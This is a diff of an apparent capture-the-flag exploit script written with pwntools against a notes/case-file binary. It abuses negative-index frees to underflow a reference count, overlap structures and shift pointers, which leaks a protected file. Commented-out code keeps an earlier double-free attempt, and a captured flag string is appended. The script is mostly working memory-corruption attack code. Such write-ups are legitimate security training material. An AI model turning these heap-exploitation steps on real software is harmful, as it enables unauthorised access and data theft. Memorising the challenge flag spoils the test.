@@ -120,17 +120,32 @@ for _ in range(31-3):
     new_file(b"a"*8, b"b"*8, b"c"*8, b"d"*20 + b"\n")
 
 # working loop nums 30, 50, 100, 200
-delete_note(b"-1") # add note ptr to end of g_case_files array
+#delete_note(b"-1") # add note ptr to end of g_case_files array
 #delete_file(b"4")
 #delete_file(b"-3") # index backwards sigsegv
 
-add_note(p64(0xdeadbeef) + b"\n") # separate top-chunk
-delete_note(b"-1") # add note ptr to end of g_case_files array
-delete_note(b"-30")
-delete_note(b"-2") # add note ptr to end of g_case_files array
-delete_note(b"-33") # double-free
+# Freeing a note will underflow the reference count.
+# Freeing a note also shifts all pointers in the global array upwards.
+# For example, the array containing: note1 | note2 | note3 | note4
+# and freeing note2 will result in the array: note1 | note3 | note4
+# We can perform a structure overlap and shift a note pointer into the array of case files
+# by freeing a negative index.
+delete_note(b"-1")
+add_note(p32(0x1) + p32(0x0) + b"FILE_TOPSEC_0000\x00" + b"\n") # separate top-chunk
+add_note(p32(0x1) + p32(0x00) + b"FILE_TOPSEC_0000\x00" + b"\n") # separate top-chunk
+delete_note(b"-1")
+print_file(b"31")
+
+#delete_note(b"-30")
+#delete_note(b"-2") # add note ptr to end of g_case_files array
+#add_note(p64(0xcafebabe) + b"\n") # separate top-chunk
+#delete_note(b"-33") # double-free
+
 io.interactive()
+
+
 """
+# Tried using a double free but remote libc was 2.23
 delete_note(b"-33") # double-free
 
 # now, we have two pointers to the same chunk
@@ -159,3 +174,5 @@ Which Note Number?
 ./ecpd(+0x116a)[0x564eaaa5b16a]
 ======= Memory map: ========
 """
+
+# flag{w3_us3d_an_AI_dec0der_r1ng}
